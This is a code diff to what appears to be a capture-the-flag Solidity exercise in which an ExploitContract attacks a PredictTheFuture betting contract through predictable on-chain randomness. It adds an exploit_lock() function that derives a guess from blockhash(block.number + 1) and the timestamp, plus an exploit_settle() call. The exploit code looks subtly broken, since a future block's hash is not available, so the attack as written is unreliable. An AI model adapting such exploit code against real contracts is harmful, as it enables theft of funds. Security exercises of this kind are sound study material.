@@ -24,8 +24,8 @@ contract PredictTheFuture {
     }
 
     function settle() public {
-        require(msg.sender == guesser);
-        require(block.number > settlementBlockNumber);
+        require(msg.sender == guesser, "Only the guesser can settle the bet");
+        require(block.number > settlementBlockNumber, "Too early");
 
         uint8 answer = uint8(
             uint256(
@@ -53,5 +53,23 @@ contract ExploitContract {
         predictTheFuture = _predictTheFuture;
     }
 
+    receive() external payable {}
+
+    function exploit_lock() public payable {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number + 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+        predictTheFuture.lockInGuess{value: 1 ether}(answer);
+    }
     // Write your exploit code below
+    function exploit_settle() public {
+        predictTheFuture.settle();
+    }
 }
